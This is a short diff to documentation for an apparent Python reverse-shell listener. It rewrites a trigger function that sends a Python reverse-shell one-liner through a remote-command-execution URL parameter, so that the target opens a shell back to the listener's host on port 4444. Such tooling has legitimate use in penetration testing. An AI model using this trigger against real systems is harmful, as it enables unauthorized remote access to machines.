@@ -142,7 +142,10 @@ Catch reverse shells directly in Python (no netcat needed):
 
    # Method 3: With trigger function
    def trigger():
-       requests.get(f"http://target/rce?cmd={python_oneliner(lhost, 4444)}")
+       # Send reverse shell command to vulnerable target
+       cmd = python_oneliner(lhost, 4444)
+       # This makes the TARGET execute the reverse shell
+       requests.get(f"http://target/rce?cmd={cmd}")
 
    quick_catch(4444, trigger_func=trigger)
 
